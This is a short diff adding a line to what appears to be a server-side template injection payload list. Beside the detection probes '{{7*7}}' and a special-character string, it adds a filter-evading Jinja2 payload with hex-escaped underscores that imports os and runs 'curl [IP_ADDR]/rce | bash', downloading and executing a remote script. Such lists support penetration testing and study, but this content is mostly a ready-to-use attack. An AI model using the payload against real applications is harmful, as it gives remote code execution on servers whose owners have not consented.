@@ -3,6 +3,7 @@
 ```
 ${{<%[%'"}}%    # Special characteres for detection
 {{7*7}}
+{{request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fimport\x5f\x5f")("os")|attr("popen")("curl [IP_ADDR]/rce | bash")|attr("read")()}}
 ```
 
 ## Python
